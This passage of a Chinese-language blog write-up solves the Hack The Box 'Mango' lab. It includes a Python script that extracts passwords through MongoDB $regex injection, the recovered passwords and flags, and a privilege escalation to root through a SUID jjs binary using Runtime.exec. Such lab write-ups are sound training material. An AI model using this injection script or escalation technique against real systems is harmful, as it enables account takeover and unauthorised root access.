+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> enum3.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python2 enum3.py<br>Valid characters <span class="hljs-keyword">for</span> admin: [<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>]<br>Valid characters <span class="hljs-keyword">for</span> mango: [<span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;^&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>]<br></code></pre></td></tr></table></figure>
+
+<p><code>以上面使用python脚本fuzz出的信息立足，爆破两个用户的密码</code><br><code>现在已经有了两个密码的字符集，更新脚本来查找密码。字符 ^，$，|，\\和.</code> </p>
+<p><code>应该用反斜杠进行转义，因为它们在正则表达式中具有特殊意义，并且可能导致错误的否定。</code></p>
+<p><code>依照之前爆破用户名脚本的方法修改脚本如下</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">from requests import post<br>from string import printable<br>url = <span class="hljs-string">&#x27;http://staging-order.mango.htb/&#x27;</span><br>admin_pass = [<span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;#&#x27;</span>, <span class="hljs-string">&#x27;\\$&#x27;</span>, <span class="hljs-string">&#x27;\\.&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>, <span class="hljs-string">&#x27;\\^&#x27;</span>, <span class="hljs-string">&#x27;\\|&#x27;</span>]<br>mango_pass = [<span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;\\$&#x27;</span>, <span class="hljs-string">&#x27;\\.&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-string">&#x27;\\^&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#x27;</span>, <span class="hljs-string">&#x27;\\|&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>]<br>def sendPayload(user, word):<br>    valid = admin_pass <span class="hljs-keyword">if</span> user == <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">else</span> mango_pass<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> valid:<br>        regex = <span class="hljs-string">&#x27;^&#123;&#125;.*&#x27;</span>.format(word + char)<br>        data = &#123; <span class="hljs-string">&#x27;username&#x27;</span> : user, <span class="hljs-string">&#x27;password[$regex]&#x27;</span> : regex, <span class="hljs-string">&#x27;login&#x27;</span> : <span class="hljs-string">&#x27;login&#x27;</span> &#125;<br>        response = post(url, data = data, allow_redirects=False)<br>        <span class="hljs-keyword">if</span> response.status_code == 302:<br>            <span class="hljs-built_in">return</span> char<br>    <span class="hljs-built_in">return</span> None<br>def getUser():<br>    <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;mango&#x27;</span>]:<br>        password = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> True:<br>            char = sendPayload(user, password)<br>            <span class="hljs-keyword">if</span> char != None:<br>                password += char<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Password for &#123;&#125; found: &#123;&#125;&quot;</span>.format(user, password)<br>                <span class="hljs-built_in">break</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getUser()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">touch</span> enum4.py<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ python2 enum4.py<br>Password <span class="hljs-keyword">for</span> admin found: t9KcS3&gt;!0B<span class="hljs-comment">#2</span><br>Password <span class="hljs-keyword">for</span> mango found: h3mXK8RhU~f&#123;]f5H<br></code></pre></td></tr></table></figure>
+
+<p>9、到这里就枚举出了，我们所需要的账号和密码了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mango<br><br>h3mXK8RhU~f&#123;]f5H<br></code></pre></td></tr></table></figure>
+
+<p>10、使用ssh 进行登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ ssh mango@10.10.10.162                       <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.162 (10.10.10.162)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:tzYGTA/kNsB/kThvsmrv2uxaUS/2zS/grRQkrbN4+RE.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.162<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">mango@10.10.10.162&#x27;</span>s password: <br>Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Tue Jan  9 13:47:24 UTC 2024<br><br>  System load:  0.0               Processes:           101<br>  Usage of /:   57.8% of 5.29GB   Users logged <span class="hljs-keyword">in</span>:     0<br>  Memory usage: 14%               IP address <span class="hljs-keyword">for</span> eth0: 10.10.10.162<br>  Swap usage:   0%<br><br><br> * Canonical Livepatch is available <span class="hljs-keyword">for</span> installation.<br>   - Reduce system reboots and improve kernel security. Activate at:<br>     https://ubuntu.com/livepatch<br><br>118 packages can be updated.<br>18 updates are security updates.<br><br><br>Last login: Mon Sep 30 02:58:45 2019 from 192.168.142.138<br>mango@mango:~$ <span class="hljs-built_in">id</span><br>uid=1000(mango) gid=1000(mango) <span class="hljs-built_in">groups</span>=1000(mango)<br>mango@mango:~$ <span class="hljs-built_in">pwd</span><br>/home/mango<br>mango@mango:~$ <span class="hljs-built_in">ls</span><br>mango@mango:~$ <br></code></pre></td></tr></table></figure>
+
+<p>11、获取到第一个用户的flag信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">mango@mango:~$ <span class="hljs-built_in">ls</span> -la /home<br>total 16<br>drwxr-xr-x  4 root  root  4096 Oct 23 13:17 .<br>drwxr-xr-x 23 root  root  4096 Oct 23 13:17 ..<br>drwxr-xr-x  2 admin admin 4096 Oct 23 13:18 admin<br>drwxr-xr-x  4 mango mango 4096 Oct 23 13:17 mango<br>mango@mango:~$ su admin<br>Password: t9KcS3&gt;!0B<span class="hljs-comment">#2</span><br>$ <span class="hljs-built_in">id</span><br>uid=4000000000(admin) gid=1001(admin) <span class="hljs-built_in">groups</span>=1001(admin)<br>$ <span class="hljs-built_in">pwd</span><br>/home/mango<br>$ <span class="hljs-built_in">cd</span> ~<br>$ <span class="hljs-built_in">pwd</span><br>/home/admin<br>$ <span class="hljs-built_in">ls</span><br>user.txt<br>$ <span class="hljs-built_in">cat</span> user.txt<br>0e9d93bd5a3112edae1f27db5e702022<br>$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>12、使用Python获取下交互式shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <br>$ python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>admin@mango:/home/admin$ <br>admin@mango:/home/admin$ <span class="hljs-built_in">ls</span> -la<br>total 24<br>drwxr-xr-x 2 admin admin 4096 Oct 23 13:18 .<br>drwxr-xr-x 4 root  root  4096 Oct 23 13:17 ..<br>lrwxrwxrwx 1 admin admin    9 Sep 27  2019 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout<br>-rw-r--r-- 1 admin admin 3771 Apr  4  2018 .bashrc<br>-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile<br>-r-------- 1 admin admin   33 Jan  9 12:27 user.txt<br></code></pre></td></tr></table></figure>
+
+<p>13、查看下 sudo 信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@mango:/home/admin$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>Sorry, user admin may not run sudo on mango.<br>admin@mango:/home/admin$ su mango<br>Password: <br>mango@mango:/home/admin$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> mango: <br>Sorry, user mango may not run sudo on mango.<br>mango@mango:/home/admin$ <br></code></pre></td></tr></table></figure>
+
+<p>14、查找下 suid 程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">mango@mango:/home/admin$ find / -perm -4000 2&gt;/dev/null<br>/bin/fusermount<br>/bin/mount<br>/bin/umount<br>/bin/su<br>/bin/ping<br>/snap/core/7713/bin/mount<br>/snap/core/7713/bin/ping<br>/snap/core/7713/bin/ping6<br>/snap/core/7713/bin/su<br>/snap/core/7713/bin/umount<br>/snap/core/7713/usr/bin/chfn<br>/snap/core/7713/usr/bin/chsh<br>/snap/core/7713/usr/bin/gpasswd<br>/snap/core/7713/usr/bin/newgrp<br>/snap/core/7713/usr/bin/passwd<br>/snap/core/7713/usr/bin/sudo<br>/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core/7713/usr/lib/openssh/ssh-keysign<br>/snap/core/7713/usr/lib/snapd/snap-confine<br>/snap/core/7713/usr/sbin/pppd<br>/snap/core/6350/bin/mount<br>/snap/core/6350/bin/ping<br>/snap/core/6350/bin/ping6<br>/snap/core/6350/bin/su<br>/snap/core/6350/bin/umount<br>/snap/core/6350/usr/bin/chfn<br>/snap/core/6350/usr/bin/chsh<br>/snap/core/6350/usr/bin/gpasswd<br>/snap/core/6350/usr/bin/newgrp<br>/snap/core/6350/usr/bin/passwd<br>/snap/core/6350/usr/bin/sudo<br>/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/snap/core/6350/usr/lib/openssh/ssh-keysign<br>/snap/core/6350/usr/lib/snapd/snap-confine<br>/snap/core/6350/usr/sbin/pppd<br>/usr/bin/newuidmap<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/passwd<br>/usr/bin/newgidmap<br>/usr/bin/run-mailcap<br>/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/sudo<br>/usr/bin/at<br>/usr/bin/traceroute6.iputils<br>/usr/bin/pkexec<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/snapd/snap-confine<br>mango@mango:/home/admin$ <br></code></pre></td></tr></table></figure>
+
+<p>15、发现了一个特殊的程序</p>
+<p><code>/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mango@mango:/home/admin$ <span class="hljs-built_in">ls</span> -la /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs<br>-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs<br></code></pre></td></tr></table></figure>
+
+<p>16、通过 gtfobins 获取到提权方法</p>
+<p><code>https://gtfobins.github.io/gtfobins/jjs/</code></p>
+<p>17、切换用户，进行尝试提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">mango@mango:~$ su admin<br>Password: <br>$ python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>admin@mango:/home/mango$ <br>admin@mango:/home/mango$ <br>admin@mango:/home/mango$ jjs<br>Warning: The jjs tool is planned to be removed from a future JDK release<br>For()Java.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cp /bin/sh /tmp/sh&#x27;</span>).<span class="hljs-built_in">wait</span> <br>0<br>For()Java.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cp /bin/sh /tmp/sh&#x27;</span>).<span class="hljs-built_in">wait</span> <br>0<br>jjs&gt; <br>jjs&gt; <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">exit</span></span>() &#123; [native code] &#125;<br>jjs&gt; quit<br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">quit</span></span>() &#123; [native code] &#125;<br>jjs&gt; <br>admin@mango:/home/mango$ <span class="hljs-built_in">cd</span> /tmp<br>admin@mango:/tmp$ <span class="hljs-built_in">ls</span><br>hsperfdata_root<br>mongodb-27017.sock<br>sh<br>systemd-private-80e8520757ca4ca296157726a81fa8f1-apache2.service-dXww2S<br>systemd-private-80e8520757ca4ca296157726a81fa8f1-systemd-resolved.service-7GqmTu<br>systemd-private-80e8520757ca4ca296157726a81fa8f1-systemd-timesyncd.service-Zu3sDz<br>vmware-root_414-592089511<br>admin@mango:/tmp$ ./sh -p<br>$ <span class="hljs-built_in">id</span><br>uid=4000000000(admin) gid=1001(admin) <span class="hljs-built_in">groups</span>=1001(admin)<br>$ jjs<br>Warning: The jjs tool is planned to be removed from a future JDK release<br>or() Java.<span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>).getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;chmod u+s /tmp/sh&#x27;</span>).waitF <br>0<br>jjs&gt; <br>$ <span class="hljs-built_in">ls</span><br>hsperfdata_root<br>mongodb-27017.sock<br>sh<br>systemd-private-80e8520757ca4ca296157726a81fa8f1-apache2.service-dXww2S<br>systemd-private-80e8520757ca4ca296157726a81fa8f1-systemd-resolved.service-7GqmTu<br>systemd-private-80e8520757ca4ca296157726a81fa8f1-systemd-timesyncd.service-Zu3sDz<br>vmware-root_414-592089511<br>$ ./sh -p<br><span class="hljs-comment"># id</span><br>uid=4000000000(admin) gid=1001(admin) euid=0(root) <span class="hljs-built_in">groups</span>=1001(admin)<br></code></pre></td></tr></table></figure>
+
+<p>18、获取下最终的 flag 信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /root/root.txt</span><br>4899beb8bf4411fd8efaecf0b5bf9460<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/214</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mango-htb-writeup</div>
+      <div>https://sh1yan.top/2024/01/09/Mango-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/10/Magic-htb-writeup-htb-writeup/" title="Magic-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Magic-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/08/Jarvis-htb-writeup/" title="Jarvis-htb-writeup">
+                        <span class="hidden-mobile">Jarvis-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
